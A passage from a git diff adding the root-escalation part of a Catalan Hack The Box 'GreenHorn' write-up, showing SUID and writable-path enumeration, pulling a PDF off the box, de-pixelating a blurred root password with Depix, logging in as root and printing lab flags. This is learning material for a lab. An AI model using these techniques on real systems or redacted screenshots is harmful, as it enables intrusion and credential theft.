@@ -495,4 +495,198 @@ cat user.txt
 c8e304fe35e34aaed749aa022a072f0e`
 ```
 
-A partir d'aquí haurem d'escalar privilegis per obtenir la password i la flag de l'usuari root.
+A partir d'aquí haurem d'escalar privilegis per obtenir la password i la flag de l'usuari root. 
+
+El primer que faig és provar el SUID,  a veure si trobem alguna cosa. Fent la cerca amb la comanda ``find / -perm -4000 2>/dev/null`` trobem aquests fitxers amb el bit SUID:
+
+```
+find / -perm -4000 2>/dev/null
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/fusermount3
+/usr/bin/sudo
+/usr/bin/newgrp`
+```
+
+Després de repassar a https://gtfobins.github.io/# i no trobar cap dels fitxers "comuns" amb SUID i poder-ho fer, he decidit cercar a internet el primer que apareix, el polkit agent helper, i pel que he vist a la cerca fet a internet sembla que es podria mirar d'escalar privilegis a root:
+
+![image](https://github.com/user-attachments/assets/cf4ac1c0-645d-46fa-a554-74dbd27fff6c)
+
+
+Després de vàries proves sense èxit sembla que no és el camí correcte. Provarem amb PATH. Per a qualsevol ordre que no estigui integrada a l'intèrpret d'ordres o que no estigui definida amb una ruta absoluta, Linux començarà a cercar a les carpetes definides a PATH. (PATH és la variable ambiental de la qual estem parlant aquí, path és la ubicació d'un fitxer):
+
+![image](https://github.com/user-attachments/assets/ddc032ae-f649-435f-bacb-a4fa6c21d98d)
+
+
+Es pot fer una cerca senzilla de carpetes escrivibles mitjançant l'ordre ``find / -writable 2>/dev/null``. La sortida d'aquesta ordre es pot netejar mitjançant una seqüència senzilla de tallar i ordenar. Sembla però que hem obtingut multitud de resultats i que no són els desitjats, per tant no seguirem per aquest camí, almenys de moment.
+
+Tornem a la màquina a veure si trobem alguna pista a algun directory o fitxer. Hi ha un pdf anomenat Using OpenVAS,pdf, vaig a provar de passarme'l a la meva màquina a veure si podem veure què hi ha a dins:
+
+```
+cd junior
+ls
+user.txt
+Using OpenVAS.pdf
+cat Using OpenVAS.pdf
+cat: Using: No such file or directory
+cat: OpenVAS.pdf: No such file or directory
+```
+
+El primer que faré al no poder veure que hi ha al fitxer PDF des de la pròpia màquina víctima, serà passar-me le fitxer a la meva màquina atacant a través d'un servidor http amb python, primer però, hem canviat el nom del fitxer perquè sigui més fàcil passar-nos-el:
+
+```
+ls
+user.txt
+Using OpenVAS.pdf
+cp 'Using OpenVAS.pdf' vas.pdf
+ls
+user.txt
+Using OpenVAS.pdf
+vas.pdf
+python3 -m http.server 4444
+10.10.14.106 - - [28/Jul/2024 15:45:02] "GET /vas.pdf HTTP/1.1" 200 -
+```
+
+I escoltem des de la nostra màquina atacant, la Kali:
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Documents/GreenHorn]
+└─# wget greenhorn.htb:4444/vas.pdf
+--2024-07-28 17:45:06--  http://greenhorn.htb:4444/vas.pdf
+Resolving greenhorn.htb (greenhorn.htb)... 10.10.11.25
+Connecting to greenhorn.htb (greenhorn.htb)|10.10.11.25|:4444... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 61367 (60K) [application/pdf]
+Saving to: ‘vas.pdf’
+
+vas.pdf                                 100%[=============================================================================>]  59.93K  --.-KB/s    in 0.1s    
+
+2024-07-28 17:45:07 (596 KB/s) - ‘vas.pdf’ saved [61367/61367]
+```
+
+Ara ja podem mirar el contingut del PDF des de la nostra Kali:
+
+![image](https://github.com/user-attachments/assets/dc88c430-7097-4787-93e5-fccd20a68316)
+
+
+La seva traducció al català és:
+
+```
+Hola, júnior,
+
+Recentment hem instal·lat OpenVAS al nostre servidor per monitorar activament i identificar possibles vulnerabilitats de seguretat. Actualment, només l'usuari root, representat per mi mateix, té l'autorització per executar OpenVAS utilitzant el següent comandament:
+sudo /usr/sbin/openvas
+Introdueix la contrasenya:
+
+Com a part de la teva familiarització amb aquesta eina, et recomanem que aprenguis a utilitzar OpenVAS de manera efectiva. En el futur, també tindràs la capacitat de executar OpenVAS introduint el mateix comandament i proporcionant la teva contrasenya quan se't demani.
+
+No dubtis a posar-te en contacte si tens cap pregunta o necessites més ajuda.
+
+Que tinguis una gran setmana,
+
+Sr. Green
+```
+
+Veient el PDF sembla que hi ha una imatge on hi ha la contrasenya "borrosa", pel que sembla la haurem de desxifrar. Provarem de trobar alguna eina que pugi transformar un fitxer PDF a imatge, per després veure si podem extreure la contrasenya de l'usuari root de la imatge. 
+
+Sembla que convertir el PDF a imatge ho podrem fer amb https://tools.pdf24.org/en/extract-images :
+
+![image](https://github.com/user-attachments/assets/a0deca81-01e8-4b63-87ce-8d0d8c86ed81)
+
+
+Se'ns descarrega un zip que hem de descomprimir, on hi haurà la imatge en format .png:
+
+![image](https://github.com/user-attachments/assets/efb5e7de-3913-4e90-89fc-0597462e137a)
+
+
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Downloads]
+└─# unzip vas.zip    
+Archive:  vas.zip
+  inflating: 0.png
+```
+
+Ara ens faltarà trobar alguna eina que pugui intentar desxifrar la password que hi ah darrere aquesta imatge. Després de buscar i buscar, a través de cerques per internet, he trobat una eina que sembla prometedora. Depix, que és una POC d'una técnica per recuperar text sense format de captures de pantalla pixelades: https://github.com/spipm/Depix 
+
+Per utilizar aquesta eina, he hagut de clonar el repositori, passar la imatge de jpg a png a través d'un conversor online (n'hi ha molts per internet que ho poden fer perfectament):
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Documents/GreenHorn]
+└─# ls
+CVE-2023-50564_Pluck-v4.7.18_PoC  Depix  hash.txt  vas.pdf  vas_page-passwd.jpg  vas_page-passwd.png
+```
+
+I ara sí que ja podem utilitzar l'eina:
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Documents/GreenHorn/Depix]
+└─# python3 depix.py \
+    -p /home/polkali/Downloads/0.png \
+    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
+    -o /output.png  
+2024-07-28 18:33:37,151 - Loading pixelated image from /home/polkali/Downloads/0.png
+2024-07-28 18:33:37,158 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
+2024-07-28 18:33:37,704 - Finding color rectangles from pixelated space
+2024-07-28 18:33:37,705 - Found 252 same color rectangles
+2024-07-28 18:33:37,705 - 190 rectangles left after moot filter
+2024-07-28 18:33:37,705 - Found 1 different rectangle sizes
+2024-07-28 18:33:37,705 - Finding matches in search image
+2024-07-28 18:33:37,706 - Scanning 190 blocks with size (5, 5)
+2024-07-28 18:33:37,727 - Scanning in searchImage: 0/1674
+2024-07-28 18:34:15,697 - Removing blocks with no matches
+2024-07-28 18:34:15,697 - Splitting single matches and multiple matches
+2024-07-28 18:34:15,701 - [16 straight matches | 174 multiple matches]
+2024-07-28 18:34:15,701 - Trying geometrical matches on single-match squares
+2024-07-28 18:34:15,943 - [29 straight matches | 161 multiple matches]
+2024-07-28 18:34:15,943 - Trying another pass on geometrical matches
+2024-07-28 18:34:16,159 - [41 straight matches | 149 multiple matches]
+2024-07-28 18:34:16,159 - Writing single match results to output
+2024-07-28 18:34:16,159 - Writing average results for multiple matches to output
+2024-07-28 18:34:18,563 - Saving output image to: /output.png
+```
+
+
+I ja tenim generada la imatge output.png, l'anem a veure per trobar la contrasenya de l'usuari root:
+
+![image](https://github.com/user-attachments/assets/e5184be3-3fda-47cb-810f-70fdc239cb8c)
+
+
+Sembla força llarga, pel que llegim és: sidefromsidetheothersidesidefromsidetheotherside
+
+Ara anem a provar d'iniciar sessió amb l'usuari root amb aquesta contrasenya a veure si està ben formatada així:
+
+```
+su
+Password: sidefromsidetheothersidesidefromsidetheotherside
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root`
+```
+
+Hem tingut èxit, per tant ara anem a buscar la flag de l'usuari root:
+
+```
+cd root
+ls
+cleanup.sh
+restart.sh
+root.txt
+cat root.txt
+9caff53cb754a2c5464aa3dc994b5927`
+```
+
+I ja hem completat la màquina!!
+
+ ![image](https://github.com/user-attachments/assets/8b1464ff-c73b-464a-830c-7c97316b6a7a)
+
+
